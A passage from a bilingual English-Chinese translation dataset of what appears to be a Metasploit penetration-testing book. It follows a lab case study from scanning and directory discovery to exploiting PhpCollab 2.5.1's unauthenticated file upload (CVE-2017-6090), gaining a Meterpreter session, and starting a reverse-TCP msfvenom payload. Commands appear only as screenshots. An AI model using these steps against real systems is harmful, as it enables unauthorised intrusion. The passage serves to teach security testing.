    for the server is left over with 50 days' time. So, what do we do? Shall we wait
    for the next 50 odd days for the service to come up again, so that we can exploit
    it again? Moreover, what if the service comes back after being patched? We could
    only end up kicking ourselves. This also shows a clear sign of poor penetration
    testing skills. Therefore, a better approach would be to use the Metasploit framework,
    which is known for making much cleaner exits, as well as offering tons of post-exploitation
    functions, such as persistence, that can help maintain permanent access to the
    server.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 考虑一个情景，我们已经 compromise 了一个 web 服务器，当我们准备离开时，被攻击的应用程序崩溃了。服务器的预定维护时间还剩下 50 天。那么，我们该怎么办？难道要等待接下来的
    50 天，等服务再次上线，这样我们才能再次利用它吗？而且，如果服务在被修补后再次上线呢？我们可能会后悔莫及。这也显示了测试技能不足的明显迹象。因此，更好的方法是使用
    Metasploit 框架，它以更干净的方式退出，并提供大量的后渗透功能，比如持久性，可以帮助保持对服务器的永久访问。
- en: The GUI environment
  id: totrans-192
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: GUI 环境
- en: Metasploit offers friendly GUI and third-party interfaces, such as Armitage.
    These interfaces tend to ease the penetration testing projects by providing services
    such as easy-to-switch workspaces, vulnerability management on the fly, and functions
    at a click of a button. We will discuss these environments more in the later chapters
    of this book.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 提供友好的 GUI 和第三方接口，比如 Armitage。这些接口通过提供易于切换的工作空间、即时漏洞管理和一键功能来简化渗透测试项目。我们将在本书的后面章节更多地讨论这些环境。
- en: Case study - diving deep into an unknown network
  id: totrans-194
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 案例研究 - 深入研究未知网络
- en: Recalling the basics of Metasploit, we are all set to perform our first penetration
    test with Metasploit. Consider an on-site scenario where we are asked to test
    an IP address and check if it's vulnerable to an attack. The sole purpose of this
    test is to ensure all proper checks are in place or not. The scenario is quite
    straightforward. We presume that all the pre-interactions are carried out with
    the client, and that the actual testing phase is going to start.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 回顾Metasploit的基础知识，我们已经准备好使用Metasploit进行第一次渗透测试。考虑一个现场场景，我们被要求测试一个IP地址并检查它是否容易受到攻击。这次测试的唯一目的是确保所有适当的检查是否已经就位。情景非常简单。我们假设所有的前期交互都已经与客户完成，并且实际的测试阶段即将开始。
- en: Please refer to the *Revisiting the case study* section if you want to perform
    the hands-on alongside reading the case study, as this will help you emulate the
    entire case study with exact configuration and network details.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您想在阅读案例研究的同时进行实际操作，请参考*重新访问案例研究*部分，因为这将帮助您模拟具有精确配置和网络详细信息的整个案例研究。
- en: Gathering intelligence
  id: totrans-197
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 情报收集
- en: As discussed earlier, the gathering intelligence phase revolves around collecting
    as much information as possible about the target. This includes performing active
    and passive scans, which include port scanning, banner grabbing, and various other
    scans. The target under the current scenario is a single IP address, so here,
    we can skip gathering passive information and can continue with the active information
    gathering methodology only.
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面讨论的，情报收集阶段围绕着尽可能收集有关目标的信息。这包括进行主动和被动扫描，其中包括端口扫描、横幅抓取和各种其他扫描。当前情景下的目标是一个单个IP地址，所以在这里，我们可以跳过收集被动信息，只能继续使用主动信息收集方法。
- en: Let's start with the footprinting phase, which includes port scanning, banner
    grabbing, ping scans to check whether the system is live or not, and service detection
    scans.
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从足迹识别阶段开始，其中包括端口扫描、横幅抓取、ping扫描以检查系统是否存活以及服务检测扫描。
- en: To conduct footprinting and scanning, Nmap proves as one of the finest tools
    available. Reports generated by Nmap can be easily imported into Metasploit. However,
    Metasploit has inbuilt Nmap functionalities, which can be used to perform Nmap
    scans from within the Metasploit framework console and store the results in the
    database.
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 进行足迹识别和扫描时，Nmap被证明是可用的最好工具之一。Nmap生成的报告可以轻松导入Metasploit。然而，Metasploit具有内置的Nmap功能，可以用于从Metasploit框架控制台执行Nmap扫描并将结果存储在数据库中。
- en: Refer to [https://nmap.org/bennieston-tutorial/](https://nmap.org/bennieston-tutorial/) for
    more information on Nmap scans.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 有关Nmap扫描的更多信息，请参考[https://nmap.org/bennieston-tutorial/](https://nmap.org/bennieston-tutorial/)。
- en: Refer to an excellent book on Nmap at: [https://www.packtpub.com/networking-and-servers/nmap-6-network-exploration-and-security-auditing-cookbook](https://www.packtpub.com/networking-and-servers/nmap-6-network-exploration-and-security-auditing-cookbook).
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 请参考一本关于Nmap的优秀书籍：[https://www.packtpub.com/networking-and-servers/nmap-6-network-exploration-and-security-auditing-cookbook](https://www.packtpub.com/networking-and-servers/nmap-6-network-exploration-and-security-auditing-cookbook)。
- en: Using databases in Metasploit
  id: totrans-203
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在Metasploit中使用数据库
- en: 'It is always a better approach to store the results automatically alongside
    when you conduct a penetration test. Making use of databases will help us build
    a knowledge base of hosts, services, and the vulnerabilities in the scope of a
    penetration test. To achieve this functionality, we can use databases in Metasploit.
    Connecting a database to Metasploit also speeds up searching and improves response
    time. The following screenshot depicts a search when the database is not connected:'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 在进行渗透测试时，自动存储结果总是更好的方法。使用数据库将帮助我们建立主机、服务和渗透测试范围内的漏洞的知识库。为了实现这个功能，我们可以在Metasploit中使用数据库。将数据库连接到Metasploit还可以加快搜索速度并提高响应时间。下面的截图显示了当数据库未连接时的搜索：
- en: '![](img/59a5e431-9dde-4408-82e8-9378e7f9ed4a.png)'
  id: totrans-205
  prefs: []
  type: TYPE_IMG
  zh: '![](img/59a5e431-9dde-4408-82e8-9378e7f9ed4a.png)'
- en: 'We saw in the installation phase how we can initialize the database for Metasploit
    and start it. To check if Metasploit is currently connected to a database or not,
    we can just type the `db_status` command, as shown in the following screenshot:'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在安装阶段看到了如何初始化Metasploit数据库并启动它。要检查Metasploit当前是否连接到数据库，我们只需输入`db_status`命令，如下面的截图所示：
- en: '![](img/c6c36c6b-2fdf-49a3-8838-aa834147f1d9.png)'
  id: totrans-207
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c6c36c6b-2fdf-49a3-8838-aa834147f1d9.png)'
- en: 'There might be situations where we want to connect to a separate database rather
    than the default Metasploit database. In such cases, we can make use of `db_connect`
    command, as shown in the following screenshot:'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 可能会出现我们想要连接到一个单独的数据库而不是默认的Metasploit数据库的情况。在这种情况下，我们可以使用`db_connect`命令，如下面的截图所示：
- en: '![](img/ddc5df69-c2a4-48db-a254-908224b13cd6.png)'
  id: totrans-209
  prefs: []
  type: TYPE_IMG
  zh: '![](img/ddc5df69-c2a4-48db-a254-908224b13cd6.png)'
- en: To connect to a database, we need to supply a username, password, and a port
    with the database name along with the `db_connect` command.
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 要连接到数据库，我们需要提供用户名、密码和端口以及`db_connect`命令的数据库名称。
- en: 'Let''s see what other core database commands are supposed to do. The following
    table will help us understand these database commands:'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看其他核心数据库命令应该做什么。下表将帮助我们理解这些数据库命令：
- en: '| **Command** | **Usage information** |'
  id: totrans-212
  prefs: []
  type: TYPE_TB
  zh: '| **命令** | **用法信息** |'
- en: '| `db_connect` | This command is used to interact with databases other than
    the default one |'
  id: totrans-213
  prefs: []
  type: TYPE_TB
  zh: '`db_connect` | 该命令用于与默认数据库以外的其他数据库进行交互'
- en: '| `db_export` | This command is used to export the entire set of data stored
    in the database for the sake of creating reports or as an input to another tool
    |'
  id: totrans-214
  prefs: []
  type: TYPE_TB
  zh: '`db_export` | 该命令用于导出数据库中存储的整套数据，以便创建报告或作为另一个工具的输入'
- en: '| `db_nmap` | This command is used for scanning the target with Nmap, and storing
    the results in the Metasploit database |'
  id: totrans-215
  prefs: []
  type: TYPE_TB
  zh: '`db_nmap` | 该命令用于使用Nmap扫描目标，并将结果存储在Metasploit数据库中'
- en: '| `db_status` | This command is used to check whether database connectivity
    is present or not |'
  id: totrans-216
  prefs: []
  type: TYPE_TB
  zh: '`db_status` | 该命令用于检查数据库连接是否存在'
- en: '| `db_disconnect` | This command is used to disconnect from a particular database
    |'
  id: totrans-217
  prefs: []
  type: TYPE_TB
  zh: '| `db_disconnect` | 该命令用于断开与特定数据库的连接 |'
- en: '| `db_import` | This command is used to import results from other tools such
    as Nessus, Nmap, and so on |'
  id: totrans-218
  prefs: []
  type: TYPE_TB
  zh: '| `db_import` | 该命令用于从Nessus、Nmap等其他工具导入结果 |'
- en: '| `db_rebuild_cache` | This command is used to rebuild the cache if the earlier
    cache gets corrupted or is stored with older results |'
  id: totrans-219
  prefs: []
  type: TYPE_TB
  zh: '| `db_rebuild_cache` | 该命令用于重新构建缓存，如果先前的缓存损坏或存储有旧的结果 |'
- en: 'Starting a new penetration test, it is always good to separate previously scanned
    hosts and their respective data from the new pentest so that it doesn''t get merged.
    We can do this in Metasploit before starting a new penetration test by making
    use of the `workspace` command, as shown in the following screenshot:'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 开始新的渗透测试时，最好将先前扫描的主机及其相应的数据与新的渗透测试分开，以免混在一起。在开始新的渗透测试之前，我们可以在Metasploit中使用`workspace`命令来做到这一点，如下面的屏幕截图所示：
- en: '![](img/992ce225-e045-402f-9794-1c9fadd34ce3.png)'
  id: totrans-221
  prefs: []
  type: TYPE_IMG
  zh: '![](img/992ce225-e045-402f-9794-1c9fadd34ce3.png)'
- en: 'To add a new workspace, we can issue the `workspace -a` command, followed by
    an identifier. We should keep identifiers as the name of the organization currently
    being evaluated, as shown in the following screenshot:'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 要添加一个新的工作空间，我们可以使用`workspace -a`命令，后面跟着一个标识符。我们应该将标识符保持为当前正在评估的组织的名称，如下面的屏幕截图所示：
- en: '![](img/8312e160-70e6-4f67-bc30-e5097c01cfc8.png)'
  id: totrans-223
  prefs: []
  type: TYPE_IMG
  zh: '![](img/8312e160-70e6-4f67-bc30-e5097c01cfc8.png)'
- en: 'We can see that we have successfully created a new workspace using the `-a`
    switch. Let''s switch the workspace by merely issuing the `workspace` command
    followed by the workspace name, as shown in the preceding screenshot. Having the
    workspace sorted, let''s quickly perform a Nmap scan over the target IP and see
    if we can get some exciting services running on it:'
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到，我们已经成功使用`-a`开关创建了一个新的工作空间。让我们通过简单地发出`workspace`命令，后面跟着工作空间名称，来切换工作空间，如前面的屏幕截图所示。有了工作空间，让我们快速对目标IP进行Nmap扫描，看看是否有一些有趣的服务在运行：
- en: '![](img/33d0d7e5-3a8e-4f8c-8388-ee15b9fce3fd.png)'
  id: totrans-225
  prefs: []
  type: TYPE_IMG
  zh: '![](img/33d0d7e5-3a8e-4f8c-8388-ee15b9fce3fd.png)'
- en: The scan results are frankly heartbreaking. No services are running on the target
    except on port `80`.
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 扫描结果让人心碎。除了端口`80`上没有运行任何服务外，目标上没有运行任何服务。
- en: By default, Nmap scans the top 1000 ports only. We can use `-p-` switch to scan
    all the 65535 ports.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下，Nmap只扫描前1000个端口。我们可以使用`-p-`开关扫描所有的65535个端口。
- en: 'Since we are connected to the Metasploit database, everything we examine gets
    logged to the database. Issuing `services` commands will populate all the scanned
    services from the database. Also, let''s perform a version detection scan through
    `db_nmap` using the `-sV` switch, as shown in the following screenshot:'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们连接到了Metasploit数据库，我们检查的所有内容都会被记录到数据库中。发出`services`命令将从数据库中填充所有扫描到的服务。此外，让我们通过`db_nmap`使用`-sV`开关执行版本检测扫描，如下面的屏幕截图所示：
- en: '![](img/d3ef9b41-45d1-4519-a687-b14da9fa1f81.png)'
  id: totrans-229
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d3ef9b41-45d1-4519-a687-b14da9fa1f81.png)'
- en: 'The previous Nmap scan found port `80` and logged it in the database. However,
    the version detection scan found the service running on port `80` which is Apache
    2.4.7 Web Server, found the MAC address, the OS type, and updated the entry in
    the database, as shown in the preceding screenshot. Since gaining access requires
    explicitly the exact exploit targeting a particular version of the software, it''s
    always good to perform a double check on the version information. Metasploit contains
    an inbuilt auxiliary module for HTTP version fingerprinting. Let''s make use of
    it, as shown in the following screenshot:'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 先前的Nmap扫描发现了端口`80`并将其记录在数据库中。然而，版本检测扫描发现了在端口`80`上运行的服务，即Apache 2.4.7 Web服务器，找到了MAC地址、操作系统类型，并更新了数据库中的条目，如前面的屏幕截图所示。由于获取访问权限需要明确针对软件特定版本的精确利用，因此始终要对版本信息进行双重检查。Metasploit包含一个用于HTTP版本指纹识别的内置辅助模块。让我们使用它，如下面的屏幕截图所示：
- en: '![](img/b5521030-a0e9-49ff-8721-d8257a058e20.png)'
  id: totrans-231
  prefs: []
  type: TYPE_IMG
  zh: '![](img/b5521030-a0e9-49ff-8721-d8257a058e20.png)'
- en: 'To launch the `http_version` scanner module, we issue the `use` command followed
    by the path of the module, which in our case is `auxiliary/scanner/http/http_version`.
    All scanning-based modules have the `RHOSTS` option to incorporate a broad set
    of IP addresses and subnets. However, since we are only testing a single IP target,
    we specify `RHOSTS` to the target IP address, which is `192.168.174.132` by using
    the `set` command. Next, we just make the module execute using the `run` command,
    as shown in the following screenshot:'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动`http_version`扫描器模块，我们发出`use`命令，后面跟着模块的路径，即`auxiliary/scanner/http/http_version`。所有基于扫描的模块都有`RHOSTS`选项，用于包含广泛的IP地址和子网。然而，由于我们只测试单个IP目标，我们使用`set`命令将`RHOSTS`指定为目标IP地址，即`192.168.174.132`。接下来，我们只需使用`run`命令执行模块，如下面的屏幕截图所示：
- en: '![](img/c238b2cf-e780-4ec5-a79c-b792fd540cf6.png)'
  id: totrans-233
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c238b2cf-e780-4ec5-a79c-b792fd540cf6.png)'
- en: 'This version of Apache is precisely the version we found in the previous Nmap
    scan. This version of Apache web server running on the target is secure, and none
    of the public exploits are present at exploit databases such as `exploit-db.com`
    and `0day.today`. Hence, we are left with no other option than looking for vulnerabilities
    in the web application, if there are any. Let''s try browsing this IP address
    and see if we can find something:'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 这个版本的Apache正是我们在先前的Nmap扫描中发现的版本。运行在目标上的这个版本的Apache Web服务器是安全的，在`exploit-db.com`和`0day.today`等利用数据库中都没有公开的利用。因此，我们别无选择，只能寻找Web应用程序中的漏洞，如果有的话。让我们尝试浏览这个IP地址，看看我们能否找到一些东西：
- en: '![](img/03412237-5930-4818-99d0-4c01b12e26e5.png)'
  id: totrans-235
  prefs: []
  type: TYPE_IMG
  zh: '![](img/03412237-5930-4818-99d0-4c01b12e26e5.png)'
- en: 'Well! We have an index page, but there is no content. Let''s try to look for
    some known directories by making use of the `dir_scanner` module from Metasploit,
    as we can see following screenshot:'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 好吧！我们有一个索引页面，但没有内容。让我们尝试使用Metasploit的`dir_scanner`模块来查找一些已知目录，如下面的屏幕截图所示：
- en: '![](img/1c6a3800-aebf-4976-b856-2461af7a8824.png)'
  id: totrans-237
  prefs: []
  type: TYPE_IMG
  zh: '![](img/1c6a3800-aebf-4976-b856-2461af7a8824.png)'
- en: 'After loading the `auxiliary/scanner/http/dir_scanner` module, let''s provide
    it with a dictionary file containing a list of known directories by setting the
    path in the `DICTIONARY` parameter. Also, we can speed up the process by increasing
    the number of threads by setting the `THREADS` parameter to `20` from `1`. Let''s
    run the module and analyze the output:'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 加载`auxiliary/scanner/http/dir_scanner`模块后，让我们通过设置`DICTIONARY`参数中的路径来提供包含已知目录列表的字典文件。此外，我们可以通过将`THREADS`参数从`1`增加到`20`来加快进程。让我们运行模块并分析输出：
- en: '![](img/16c96d27-e889-4d4c-95f2-e48bf9f66679.png)'
  id: totrans-239
  prefs: []
  type: TYPE_IMG
  zh: '![](img/16c96d27-e889-4d4c-95f2-e48bf9f66679.png)'
- en: 'The space character between the individual directory entries has yielded a
    lot of false positives. However, we got 302 response code from a `phpcollab` directory,
    which indicated that while trying to access `phpcollab` directory, the module
    got a response to redirect (302). The response is interesting; let''s see what
    we get when we try to open the `phpcollab` directory from the browser:'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: 在单个目录条目之间的空格字符产生了很多误报。然而，我们从`phpcollab`目录得到了302响应代码，这表明在尝试访问`phpcollab`目录时，模块收到了重定向响应（302）。响应很有趣；让我们看看当我们尝试从浏览器打开`phpcollab`目录时会得到什么：
- en: '![](img/eb205077-f438-4f41-9da7-d88e6649c5ed.png)'
  id: totrans-241
  prefs: []
  type: TYPE_IMG
  zh: '![](img/eb205077-f438-4f41-9da7-d88e6649c5ed.png)'
- en: Nice! We have a PHP-based application running. Hence, we got a 302 response
    in the Metasploit module.
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 很好！我们有一个基于PHP的应用程序正在运行。因此，我们在Metasploit模块中得到了302响应。
- en: Modeling threats
  id: totrans-243
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 威胁建模
- en: 'From the intelligence gathering phase, we can see that only port `80` is open
    on the target system and the application running on it isn''t vulnerable and is
    running the PhpCollab Web application on it. To gain access to the PhpCollab portal,
    trying some random passwords and username yields no success. Even searching Metasploit,
    we don''t have modules for PhpCollab:'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 从情报收集阶段，我们可以看到目标系统上只有端口`80`是开放的，并且运行在上面的应用程序不容易受到攻击，正在运行PhpCollab Web应用程序。尝试一些随机密码和用户名来访问PhpCollab门户没有成功。即使搜索Metasploit，我们也没有PhpCollab的模块：
- en: '![](img/56c38e6d-d50c-41b4-a6bd-84f89ade6bc8.png)'
  id: totrans-245
  prefs: []
  type: TYPE_IMG
  zh: '![](img/56c38e6d-d50c-41b4-a6bd-84f89ade6bc8.png)'
- en: 'Let''s try searching PhpCollab using the `searchsploit` tool from [https://exploit-db.com/](https://exploit-db.com/).
    The searchsploit allows you to easily search from all the exploits currently hosted
    on exploit database website as it maintains an offline copy of all the exploits:'
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们尝试使用`searchsploit`工具从[https://exploit-db.com/](https://exploit-db.com/)搜索PhpCollab。searchsploit允许您轻松搜索托管在exploit数据库网站上的所有漏洞，因为它维护了所有漏洞的离线副本：
- en: '![](img/0197412f-009d-4d48-9688-fe83737d69c5.png)'
  id: totrans-247
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0197412f-009d-4d48-9688-fe83737d69c5.png)'
- en: Voila! We have an exploit for PhpCollab, and the good news is that it's already
    in the Metasploit exploit format.
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 哇！我们有一个PhpCollab的漏洞利用，好消息是它已经在Metasploit漏洞利用格式中。
- en: Vulnerability analysis - arbitrary file upload (unauthenticated)
  id: totrans-249
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 漏洞分析 - 任意文件上传（未经身份验证）
- en: The PhpCollab application does not filter the content of the uploaded files
    correctly. Hence, it is possible for an unauthenticated attacker to upload a malicious
    file and run arbitrary code.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: PhpCollab应用程序没有正确过滤上传文件的内容。因此，未经身份验证的攻击者可以上传恶意文件并运行任意代码。
- en: Attacking mechanism on the PhpCollab 2.5.1 application
  id: totrans-251
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 对PhpCollab 2.5.1应用程序的攻击机制
- en: 'The application can get compromised if an attacker uploads a malicious PHP
    file by sending a `POST` request on the `/clients/editclient.php?id=1&action=update`
    URL. The code does not validate the request if it''s originating from an authenticated
    user or not. The problematic code is as follows:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 如果攻击者通过在`/clients/editclient.php?id=1&action=update` URL上发送`POST`请求上传恶意的PHP文件，应用程序可能会受到威胁。代码没有验证请求是否来自经过身份验证的用户。有问题的代码如下：
- en: '![](img/74987986-281a-4153-a29f-74d7a6d7524f.png)'
  id: totrans-253
  prefs: []
  type: TYPE_IMG
  zh: '![](img/74987986-281a-4153-a29f-74d7a6d7524f.png)'
- en: From line number 2, we can see that the uploaded file is saved to the `logos_clients`
    directory with the name as `$id` followed by the `$extention`, which means that
    since we have `id=1` in the URL, the uploaded backdoor will be saved as `1.php`
    in the `logos_clients` directory.
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 从第2行，我们可以看到上传的文件以`$id`后跟`$extention`的形式保存在`logos_clients`目录中，这意味着由于我们在URL中有`id=1`，上传的后门将保存为`1.php`在`logos_clients`目录中。
- en: 'For more information on this vulnerability, refer to: [https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/](https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/).'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 有关此漏洞的更多信息，请参阅：[https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/](https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/)。
- en: Exploitation and gaining access
  id: totrans-256
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用和获取访问权限
- en: 'To gain access to the target, we need to copy this exploit into Metasploit.
    However, copying external exploits directly to Metasploit''s exploit directory
    is highly discouraged and bad practice since you will lose the modules on every
    update. It''s better to keep external modules in a generalized directory rather
    than Metasploit''s `modules` directory. However, the best possible way to keep
    the modules is to create a similar directory structure elsewhere on the system
    and load it using the `loadpath` command. Let''s copy the found module to some
    directory:'
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 为了访问目标，我们需要将此漏洞利用复制到Metasploit中。然而，直接将外部漏洞利用复制到Metasploit的漏洞利用目录是不鼓励的，也是不良实践，因为您将在每次更新时丢失模块。最好将外部模块保存在一个通用目录中，而不是Metasploit的`modules`目录。然而，保持模块的最佳方法是在系统的其他地方创建类似的目录结构，并使用`loadpath`命令加载它。让我们将找到的模块复制到某个目录：
- en: '![](img/017e243f-2795-4d0d-9601-5e7cf1ff2c73.png)'
  id: totrans-258
  prefs: []
  type: TYPE_IMG
  zh: '![](img/017e243f-2795-4d0d-9601-5e7cf1ff2c73.png)'
- en: 'Let''s create the directory structure, as shown in the following screenshot:'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们创建目录结构，如下截图所示：
- en: '![](img/99eda91e-0276-4817-8bfb-775dd17f5eb0.png)'
  id: totrans-260
  prefs: []
  type: TYPE_IMG
  zh: '![](img/99eda91e-0276-4817-8bfb-775dd17f5eb0.png)'
- en: 'We can see that we created a Metasploit-friendly structure in the `MyModules`
    folder which is `modules/exploits/nipun`, and moved the exploit into the directory
    as well. Let''s load this structure into Metasploit as follows:'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到，我们在`MyModules`文件夹中创建了一个Metasploit友好的结构，即`modules/exploits/nipun`，并将漏洞也移动到了该目录中。让我们按照以下步骤将此结构加载到Metasploit中：
- en: '![](img/136576fe-aa6f-4577-83d3-de8fbb989fa8.png)'
  id: totrans-262
  prefs: []
  type: TYPE_IMG
  zh: '![](img/136576fe-aa6f-4577-83d3-de8fbb989fa8.png)'
- en: 'We have successfully loaded the exploit into Metasploit. Let''s use the module,
    as shown in the following screenshot:'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已成功将漏洞加载到Metasploit中。让我们使用模块，如下面的截图所示：
- en: '![](img/c62bb5cb-bc08-488a-a81b-23088997df3f.png)'
  id: totrans-264
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c62bb5cb-bc08-488a-a81b-23088997df3f.png)'
- en: 'The module requires us to set the address of the remote host, remote port,
    and the path to the PhpCollab application. Since the path (`TARGETURI`) and the
    remote port (`RPORT`) are already set, let''s set `RHOST` to the IP address of
    the target and issue the `exploit` command:'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 该模块要求我们设置远程主机的地址、远程端口和PhpCollab应用程序的路径。由于路径（`TARGETURI`）和远程端口（`RPORT`）已经设置好了，让我们将`RHOST`设置为目标的IP地址，并发出`exploit`命令：
- en: '![](img/81cc995e-f14d-4929-85d9-77f80f484310.png)'
  id: totrans-266
  prefs: []
  type: TYPE_IMG
  zh: '![](img/81cc995e-f14d-4929-85d9-77f80f484310.png)'
- en: 'Voila! We got access to the system. Let''s make use of some of the basic post-exploitation
    commands and analyze the output, as shown in the following screenshot:'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 哇！我们已经访问了系统。让我们使用一些基本的后期利用命令并分析输出，如下面的截图所示：
- en: '![](img/3d21f6bb-7394-414b-a08d-4f01f2a36c2b.png)'
  id: totrans-268
  prefs: []
  type: TYPE_IMG
  zh: '![](img/3d21f6bb-7394-414b-a08d-4f01f2a36c2b.png)'
- en: 'As we can see in the preceding screenshot, running the `sysinfo` command harvests
    the system''s information such as computer name, OS, architecture, which is the
    64-bit version, and the Meterpreter version, which is a PHP-based Meterpreter.
    Let''s drop into a system shell on the compromised host using the `shell` command,
    as shown in the following screenshot:'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们在前面的截图中所看到的，运行`sysinfo`命令可以获取系统的信息，如计算机名称、操作系统、架构（64位版本）和Meterpreter版本（基于PHP的Meterpreter）。让我们使用`shell`命令在受损主机上进入系统shell，如下面的截图所示：
- en: '![](img/91f91844-a74d-49c7-9fa8-176457be5f11.png)'
  id: totrans-270
  prefs: []
  type: TYPE_IMG
  zh: '![](img/91f91844-a74d-49c7-9fa8-176457be5f11.png)'
- en: 'We can see that as soon as we dropped into a system shell, running commands
    such as `id` provides us with the input that our current user is using, `www-data`
    which means that to gain complete control of this system, we require root privileges.
    Additionally, issuing the `lsb_release -a` command outputs the OS version with
    the exact release and codename. Let''s take a note of it as it would be required
    in gaining root access to the system. However, before we move on to the rooting
    part, let''s gain some of the basic information from the system, such as the current
    process ID using the `getpid` command, the current user ID using the `getuid`
    command, the `uuid` for the unique user identifier, and the `machine_id`, which
    is the identifier to the compromised machine. Let''s run all of the commands we
    just discussed and analyze the output:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到，一旦我们进入系统shell，运行诸如`id`之类的命令会提供我们当前用户正在使用的输入，即`www-data`，这意味着要完全控制该系统，我们需要root权限。此外，发出`lsb_release
    -a`命令会输出具有确切版本和代号的操作系统版本。让我们记下它，因为在获取对系统的root访问权限时会需要。然而，在我们继续进行root操作之前，让我们从系统中获取一些基本信息，例如使用`getpid`命令获取当前进程ID，使用`getuid`命令获取当前用户ID，用于唯一用户标识符的`uuid`和用于受损机器的`machine_id`。让我们运行我们刚刚讨论的所有命令并分析输出：
- en: '![](img/d8dc37ab-1348-4ad1-aa25-6a7b3765cd6f.png)'
  id: totrans-272
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d8dc37ab-1348-4ad1-aa25-6a7b3765cd6f.png)'
- en: 'The amount of information we got is pretty straightforward. We have the ID
    of the current process our Meterpreter is sitting in, we have the user ID, UUID,
    and the machine ID. However, an important thing to take note of here is that our
    access is PHP Meterpreter-based and the limitation of the PHP Meterpreter is that
    we can''t run privileged commands which can easily be provided by more concrete
    binary Meterpreter shells such as **reverse TCP**. First, let''s escalate us onto
    a more concrete shell to gain a better level of access to the target. We will
    make use of the `msfvenom` command to create a malicious payload; we will then
    upload it to the target system and execute it. Let''s get started:'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 我们得到的信息相当直接。我们有当前进程的ID，我们的Meterpreter所在的用户ID，UUID和机器ID。然而，这里需要注意的一点是，我们的访问是基于PHP
    Meterpreter的，而PHP Meterpreter的限制是我们无法运行特权命令，这些命令可以很容易地由更具体的二进制Meterpreter shells（如**reverse
    TCP**）提供。首先，让我们升级到更具体的shell，以获得更好的目标访问级别。我们将使用`msfvenom`命令创建一个恶意载荷；然后我们将上传到目标系统并执行它。让我们开始吧：
- en: '![](img/7e9ec54d-c293-4442-b74b-d40e034affc5.png)'
  id: totrans-274
  prefs: []
  type: TYPE_IMG
  zh: '![](img/7e9ec54d-c293-4442-b74b-d40e034affc5.png)'
- en: Since our compromised host is running on a 64-bit architecture, we will use
    the 64-bit version of the Meterpreter, as shown in the preceding screenshot. MSFvenom
    generates robust payloads based on our requirements. We have specified the payload
    using the `-p` switch, and it is none other than `linux/x64/meterpreter/reverse_tcp`.
    This payload is the 64-bit Linux compatible Meterpreter payload which, once executed
    on the compromised system, will connect back to our listener and will provide
    us with access to the machine. Since the payload has to connect back to us, it
